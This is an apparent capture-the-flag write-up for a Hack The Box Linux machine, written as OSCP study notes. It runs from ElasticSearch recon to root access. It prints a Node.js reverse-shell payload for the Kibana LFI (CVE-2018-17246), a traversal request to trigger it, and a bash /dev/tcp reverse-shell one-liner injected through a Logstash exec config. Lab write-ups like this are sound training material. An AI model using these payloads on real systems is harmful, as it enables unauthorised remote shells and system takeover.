## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)
- Prep: [OSCP](OSCP.md)

### 🧭 Recon

#### Nmap
```
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.115
nmap -sC -sV -p 22,80,9200 -oA scans/nmap-scripts 10.10.10.115
```
- Open ports: 22 [SSH](SSH), 80 [HTTP](HTTP.md), 9200 (ElasticSearch/HTTP)

#### Port 80 - Website
- Basic HTML page with image: `needle.jpg`
- `strings -n 20 needle.jpg` → revealed base64: `bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==`
- Decoded: `la aguja en el pajar es "clave"`

#### Port 9200 - ElasticSearch
```
curl http://10.10.10.115:9200/_cat/indices?v
```
- Notable indexes: `quotes`, `bank`, `api`, `.kibana`

#### Extracting sensitive strings
```
curl -s -X GET "http://10.10.10.115:9200/quotes/_search?size=1000" -H 'Content-Type: application/json' -d'{"query": {"match_all": {}}}' | jq -c '.hits.hits[]' | grep clave
```
- Found base64 encoded user and password:
```
echo dXNlcjogc2VjdXJpdHkg | base64 -d  # user: security
echo cGFzczogc3BhbmlzaC5pcy5rZXk= | base64 -d  # pass: spanish.is.key
```

### 🐚 Shell as security
```
ssh security@10.10.10.115
```
- Successfully authenticated.
- Grab `user.txt`

### 📦 Port Forwarding to Kibana
```
ssh -L 5601:localhost:5601 security@10.10.10.115
```
- Access Kibana via: http://localhost:5601

### 🐚 Shell as kibana

#### Kibana CVE-2018-17246
- Create payload at `/dev/shm/0xdf.js`:
```js
(function(){
  var net = require("net"),
      cp = require("child_process"),
      sh = cp.spawn("/bin/sh", []);
  var client = new net.Socket();
  client.connect(443, "10.10.14.8", function(){
      client.pipe(sh.stdin);
      sh.stdout.pipe(client);
      sh.stderr.pipe(client);
  });
  return /a/;
})();
```
- Trigger LFI execution:
```
curl 'http://localhost:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../../dev/shm/0xdf.js'
```
- Catch reverse shell: `nc -lnvp 443`

### 🧪 Privesc: kibana → root

#### Logstash Misconfiguration
- Logstash runs as **root**
- Kibana can read `/etc/logstash/conf.d` configs

##### Relevant config snippets:
- **input.conf**: watches `/opt/kibana/logstash_*` files
- **filter.conf**: parses `Ejecutar comando: <COMMAND>`
- **output.conf**: uses `exec` plugin to run the command

##### Trigger
```
echo "Ejecutar comando: bash -c 'bash -i >& /dev/tcp/10.10.14.8/443 0>&1'" > /opt/kibana/logstash_rootme
```
- Catch shell: `nc -lnvp 443`

### 🏁 Root access
```
id
cat /root/root.txt
```

---

## ✅ Summary
- Recon revealed ElasticSearch and Kibana
- Found SSH credentials via stego in ElasticSearch
- Used Kibana LFI (CVE-2018-17246) to gain shell as kibana
- Privileged escalation through Logstash input config
- Root compromise complete

---

## 🏷 Tags
`ElasticSearch`, `Kibana`, `CVE-2018-17246`, `Logstash`, `File Monitoring`, `Reverse Shell`, `HTB`, `Privilege Escalation`, `Command Injection`, `Steganography`, `SSH`

